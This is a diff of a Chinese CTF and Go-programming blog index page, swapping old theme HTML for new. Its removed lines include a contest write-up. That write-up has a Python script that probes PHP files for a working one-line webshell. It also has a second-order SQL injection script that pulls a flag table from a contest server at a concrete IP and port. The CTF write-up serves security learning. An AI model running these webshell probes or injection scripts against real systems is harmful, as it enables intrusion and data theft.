@@ -1,1694 +1,283 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
-<head>
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!--Description-->
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>h3110w0r1d's Blog - we can be what we are willing to be</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="h3110w0r1d&#39;s Blog">
+<meta property="og:url" content="http://dezhoutorizhao.github.io/page/4/index.html">
+<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
+<meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
+<meta property="article:author" content="h3110w0r1d">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/page/4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'h3110w0r1d\'s Blog',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-15 13:56:44'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-        <meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
     
-
-    <!--Author-->
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
     
-        <meta name="author" content="h3110w0r1d">
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-
-    <!--Open Graph Title-->
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-        <meta property="og:title" content="h3110w0r1d&#39;s Blog"/>
-    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">h3110w0r1d's Blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%A2%98%E8%A7%A3/" title="迎新赛题解">迎新赛题解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-09-23T11:52:20.997Z" title="发表于 2022-09-23 19:52:20">2022-09-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">2.5W
+   查看压缩包内容
 
-    <!--Open Graph Description-->
-    
-        <meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全" />
-    
+  在源文件目录区解出一段base64，将此编码解密后得到flag的第一段
 
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="h3110w0r1d&#39;s Blog"/>
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="website" />
-    
-
-    <!--Page Cover-->
-    
-
-    
-        <meta name="twitter:card" content="summary" />
-    
-    
-    
-
-    <!-- Title -->
-    
-    <title>page - h3110w0r1d&#39;s Blog</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
-
-    <!-- Custom CSS -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-
-    <!-- Google Analytics -->
-    
-
-
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-
-<body>
-
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
-
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-            <li class="menu-item">
-                <a href="/">
-                    Home
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/archives">
-                    Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    Tags
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    Categories
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/contact.html">
-                    Contact
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-</div>
-
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
-</nav>
-
-<div class="container">
-
-    <!-- Main Content -->
-    <div class="row">
-    <div class="col-sm-12">
-
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
-        
-            <h1 id="main-title" class="title">h3110w0r1d's Blog</h1>
-        
-    </div>
-</header>
-
-        <section class="main">
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%A2%98%E8%A7%A3/">
-                迎新赛题解
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-09-23</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%A2%98%E8%A7%A3/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="2-5W"><a href="#2-5W" class="headerlink" title="2.5W"></a>2.5W</h1><ol>
-<li><p>   查看压缩包内容</p>
-</li>
-<li><p>  在源文件目录区解出一段base64，将此编码解密后得到flag的第一段</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221012190719.png"></p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923195735.png"></p>
-</li>
-<li><p>  将压缩包拖入010editor中，查看文件尾得到最后一段flag</p>
-</li>
-<li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923200010.png"></p>
-</li>
-</ol>
-<h1 id="眼花缭乱"><a href="#眼花缭乱" class="headerlink" title="眼花缭乱"></a>眼花缭乱</h1><ol>
-<li><p>  这个题目中有多个一句话木马，但是只有一个是可以的，其它的都将参数置为空了，无法利用</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220924091522.png"></p>
-</li>
-<li><p>  手动寻找不现实，只能写脚本</p>
-</li>
-<li><p>```python<br>  import os<br>  import requests<br>  import re<br>  import threading<br>  import time<br>  print(‘开始时间：  ‘+  time.asctime( time.localtime(time.time()) ))<br>  s1=threading.Semaphore(30)                                            #这儿设置最大的线程数<br>  filePath = r”D:\phpstudy_pro\WWW\src”                 #指定文件路径<br>  os.chdir(filePath)                                                    #改变当前工作的路径<br>  requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接<br>  files = os.listdir(filePath)                                        #os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。<br>  session = requests.Session()                                        #创建session对象<br>  session.keep_alive = False                                             # 设置连接活跃状态为False<br>  def get_content(file):                                              #用来对单个php文件进行测试的函数</p>
-<pre><code>  s1.acquire()
-  print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))
-  with open(file,encoding=&#39;utf-8&#39;) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数
-          gets = list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))        #获取文件中包含所有GET型参数的名字的列表
-          posts = list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))      #获取文件中包含所有POST型参数的名字的列表
-  data = &#123;&#125;                                                        #所有的$_POST
-  params = &#123;&#125;                                                        #所有的$_GET
-  for m in gets:                                                  #为所有的get型参数赋值存在字典中
-      params[m] = &quot;echo &#39;xxxxxx&#39;;&quot;
-  for n in posts:                                                 #为所有的post型参数赋值存在字典中
-      data[n] = &quot;echo &#39;xxxxxx&#39;;&quot;
-  url = &#39;http://127.0.0.1/src/&#39;+file                          #放在自己的www目录下，进行拼接，方便request进行请求
-  req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST
-  req.close()                                                # 关闭请求  释放内存
-  req.encoding = &#39;utf-8&#39;
-  content = req.text                                          #获取请求后网页的返回内容
-
-  if &quot;xxxxxx&quot; in content:                                    #判断phpecho语句是否被执行，如果发现有可以利用的参数，继续筛选出具体的参数
-      flag = 0
-      for a in gets:
-          req = session.get(url+&#39;?%s=&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)
-          content = req.text
-          req.close()                                                # 关闭请求  释放内存
-          if &quot;xxxxxx&quot; in content:
-              flag = 1                                            #表明是get型参数起作用
-              break
-      if flag != 1:
-          for b in posts:
-              req = session.post(url, data=&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)
-              content = req.text
-              req.close()                                                # 关闭请求  释放内存
-              if &quot;xxxxxx&quot; in content:                                 #表明是post型参数起作用
-                  break
-      if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
-          param = a
-      else:
-          param = b
-      print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)
-      print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))
-  s1.release()
-</code></pre>
-<p>  for i in files:                                                            #加入多线程</p>
-<pre><code> t = threading.Thread(target=get_content, args=(i,))
- t.start()
-</code></pre>
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   在xk0SzyKwfzw.php文件中有一个一句话木马，可以进行get传参请求,进行命令执行
-
-6.   &#96;&#96;&#96;php
-     $XnEGfa &#x3D; $_GET[&#39;Efa5BVG&#39;] ?? &#39; &#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221012185724.png"></p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221012190214.png"></p>
-</li>
-<li><p>  在根目录下找到了flag</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221012190248.png"></p>
-</li>
-<li><p>  cat出答案</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221012190356.png"></p>
-</li>
-</ol>
-<h1 id="mid-sql"><a href="#mid-sql" class="headerlink" title="mid_sql"></a>mid_sql</h1><ol>
-<li><p>  这道题是一个二次注入</p>
-</li>
-<li><p>  先用御剑扫一下，发现有另一个文件register.php，注册页面</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923203957.png"></p>
-</li>
-<li><p>  当注册的用户名为1’ and ‘1时,用户名为1，存在二次注入漏洞</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923205044.png"></p>
-</li>
-<li><p>  写个脚本去跑</p>
-</li>
-<li><p>  贴个脚本</p>
-</li>
-<li><pre><code class="php">  #coding:utf-8
-  import requests
-  import re
   
+
   
-  url = &#39;http://43.138.59.13:8309/&#39;
+
+  将压缩包拖入010editor中，查看文件尾得到最后一段flag
+
+
+
+
+眼花缭乱
+  这个题目中有多个一句话木马，但是只有一个是可以的，其它的都将参数置为空了，无法利用
+
   
-  m = &#39;&#39;
-  for i in range(100):
-      payload = &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#39;0&quot;.format(i+1)
-      register = &#123;&#39;email&#39;:&#39;abc&#123;&#125;@qq.com&#39;.format(i),&#39;username&#39;:payload,&#39;password&#39;:&#39;123456&#39;&#125;
-      login = &#123;&#39;email&#39;:&#39;abc&#123;&#125;@qq.com&#39;.format(i),&#39;password&#39;:&#39;123456&#39;&#125;
-      req = requests.session()
-      r1 = req.post(url+&#39;register.php&#39;,data = register)
-      r2 = req.post(url+&#39;login.php&#39;, data = login)
-      r3 = req.post(url+&#39;index.php&#39;)
-      content = r3.text
-      # print(content)
-      con = re.findall(&#39;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#39;,content,re.S|re.M)
-      # re.findall也不错，也挺好，
-      # con = re.search(&#39;&lt;span class=&quot;user-name&quot;&gt;(.*)&lt;/span&gt;&#39;,content,re.M|re.S)
-      # print(con[0].strip())
-      a = int (con[0].strip())  # 转一下 类型，因为html中的是str的， 要转为int才行。
-      # print(type(a))
-      m = m+chr(a)
-      print(m)
+
+  手动寻找不现实，只能写脚本
+
+```python  import os  import requests  import re  import threading  import time  print(‘开始时间：  ‘+  time.asctime( time.localtime(time.time()) ))  s1=threading.Semaphore(30)                                            #这儿设置最大的线程数  filePath = r”D:\phpstudy_pro\WWW\src”                 #指定文件路径  os.chdir(filePath)                  ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/go%E8%AF%AD%E8%A8%80%E8%AF%AD%E6%B3%95/" title="go语言语法">go语言语法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-09-21T07:51:44.733Z" title="发表于 2022-09-21 15:51:44">2022-09-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/go/">go</a></span></div><div class="content">go语言特点
   
-  
-</code></pre>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220923205750.png"></p>
-</li>
-</ol>
 
-        </div>
-    
+第一个go语言package main
 
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/go%E8%AF%AD%E8%A8%80%E8%AF%AD%E6%B3%95/">
-                go语言语法
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-09-21</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/go%E8%AF%AD%E8%A8%80%E8%AF%AD%E6%B3%95/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/go/">go</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="go语言"><a href="#go语言" class="headerlink" title="go语言"></a>go语言</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921171704.png"></li>
-</ol>
-<h2 id="第一个go语言"><a href="#第一个go语言" class="headerlink" title="第一个go语言"></a>第一个go语言</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
-
-<span class="token keyword">import</span> <span class="token string">"fmt"</span>
-
-<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Hello world"</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#125;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="go语言基础组成"><a href="#go语言基础组成" class="headerlink" title="go语言基础组成"></a>go语言基础组成</h2><ol>
-<li>  包声明</li>
-<li>  引入包</li>
-<li>  函数</li>
-<li>  函数</li>
-<li>  变量</li>
-<li>  语句&amp;表达式</li>
-<li>  注释</li>
-</ol>
-<h3 id="各个部分"><a href="#各个部分" class="headerlink" title="各个部分"></a>各个部分</h3><ol>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921171944.png"></li>
-<li>  第一行代码 <em>package main</em> 定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。</li>
-<li>  下一行 <em>import “fmt”</em> 告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数  fmt包：format</li>
-<li>  下一行 <em>func main()</em> 是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。</li>
-<li>  下一行 /<em>…</em>/ 是注释，在程序执行时将被忽略。单行注释是最常见的注释形式，你可以在任何地方使用以 // 开头的单行注释。多行注释也叫块注释，均已以 /* 开头，并以 */ 结尾，且不可以嵌套使用，多行注释一般用于包的文档描述或注释成块的代码片段。 </li>
-<li>下一行 <em>fmt.Println(…)</em> 可以将字符串输出到控制台，并在最后自动增加换行字符 \n。<br>  使用 fmt.Print(“hello, world\n”) 可以得到相同的结果。<br>   Print 和 Println 这两个函数也支持使用变量，如：fmt.Println(arr)。如果没有特别指定，它们会以默认的打印格式将变量 arr 输出到控制台。</li>
-<li>  当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected  ）。</li>
-<li>  <strong>即大写字母开头为public , 小写字母开头为protected</strong></li>
-</ol>
-<h2 id="执行go"><a href="#执行go" class="headerlink" title="执行go"></a>执行go</h2><ol>
-<li><p>```go<br>  go run hello.go //编译并执行代码</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-2.   &#96;&#96;&#96;go
-     go build hello.go &#x2F;&#x2F;go build命令来生成二进制文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  生成的二进制文件没有.go后缀，直接 <strong>./文件名</strong> 即可运行程序</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921173130.png"></p>
-</li>
-</ol>
-<h2 id="自动编译脚本"><a href="#自动编译脚本" class="headerlink" title="自动编译脚本"></a>自动编译脚本</h2><ol>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921173327.png"></p>
-</li>
-<li><p>```go<br>  #!/usr/bin/env bash</p>
-<p>  CURRENT_DIR=<code>pwd</code><br>  OLD_GO_PATH=”$GOPATH”  #例如: /usr/local/go<br>  OLD_GO_BIN=”$GOBIN”    #例如: /usr/local/go/bin</p>
-<p>  export GOPATH=”$CURRENT_DIR”<br>  export GOBIN=”$CURRENT_DIR/bin”</p>
-<p>  #指定并整理当前的源码路径<br>  gofmt -w src</p>
-<p>  go install test_hello</p>
-<p>  export GOPATH=”$OLD_GO_PATH”<br>  export GOBIN=”$OLD_GO_BIN”</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-
-
-## 关于包
-
-1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220921173409.png)
-2.   同一个文件夹下的文件只能有一个包名，否则会编译报错
-
-## 行分隔符
-
-1.   在 Go 程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。
-
-     如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。
-
-2.   &#96;&#96;&#96;go
-     fmt.Println(&quot;Hello, World!&quot;)
-     fmt.Println(&quot;菜鸟教程：runoob.com&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="Go-语言的空格"><a href="#Go-语言的空格" class="headerlink" title="Go 语言的空格"></a>Go 语言的空格</h2><ol>
-<li><p>  Go 语言中变量的声明必须使用空格隔开</p>
-</li>
-<li><p>```go<br>  var age int;</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-## 格式化字符串
-
-1.   &#96;&#96;&#96;
-     fmt.Sprintf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  使用fmt.Sprintf格式化字符串并赋值给新串</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921175725.png"></p>
-</li>
-</ol>
-<h2 id="go语言变量"><a href="#go语言变量" class="headerlink" title="go语言变量"></a>go语言变量</h2><ol>
-<li><p>  声明变量的一般形式是使用<strong>var关键字</strong></p>
-</li>
-<li><p>```go<br>  var identifier type</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   也可以一次声明多个变量
-
-4.   &#96;&#96;&#96;go
-     var identifier1,identifier2 type<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>```go<br>  package main<br>  import “fmt”<br>  func main(){</p>
-<pre><code>  var a string = &quot;Runoob&quot;
-  fmt.Println(a)
-  var b,c int = 1,2
-  fmt.Println(b,c)
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-## 变量声明
-
-1.   第一种，指定变量类型，如果没有初始值，则变量默认为0值
-
-2.   &#96;&#96;&#96;go
-     var v_name v_type
-     v_name &#x3D; v_type<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  零值就是变量没有做初始化时系统默认设置的值</p>
-</li>
-<li><p>```go<br>  package main<br>  import “fmt”<br>  func main(){</p>
-<pre><code>  var a = &quot;Runoob&quot;    
-  fmt.Println(a)
-  
-  var a int
-  fmt.Println(b) //int值默认为0
-  
-  var c bool
-  fmt.Println(c) //bool值默认是false
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   第二种，根据值自行判定变量类型
-
-6.   &#96;&#96;&#96;go
-     var v_name &#x3D; value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  第三种，如果变量已经使用var声明过了，再使用 := 声明变量，就产生编译错误</p>
-</li>
-<li><p>```go<br>  var intVal int<br>  //下面不能使用 intVal := 1,因为intVal 已经声明，不需要重新声明</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-9.   第四种，直接使用 :&#x3D; 来声明即可
-
-10.   &#96;&#96;&#96;go
-      intVal :&#x3D; 1 &#x2F;&#x2F;此时不会产生编译错误，因为有声明新的变量，因为:&#x3D;是一个声明语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>```go<br>  var intVal int<br>  intVal = 1<br>  //和上面:=声明赋值相同</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-
-
-### 多变量声明
-
-1.   &#96;&#96;&#96;go
-     &#x2F;&#x2F;类型相同的多个变量，而非全局变量
-     var vname1,vname2,vname3 type
-     vname1,vname2,vname3 &#x3D; v1,v2,v3
-     var vname1,vname2,vname3 &#x3D; v1,v2,v3
-     vname1,vname2,vname3 :&#x3D; v1,v2,v3 &#x2F;&#x2F;出现在:&#x3D;左侧的变量不应该是已经被声明过的，否则会导致编译错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  我的理解：</p>
-</li>
-<li><p>```go<br>  // var关键字用来声明<br>  // :=用来在赋值之前进行声明<br>  // 使用 := 不带var关键字声明格式的只能在函数体中出现，不能和全局变量一样放到</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-4.   声明全局变量的隐式分解的写法
-
-5.   &#96;&#96;&#96;go
-     var(
-     	vname1 v_type1
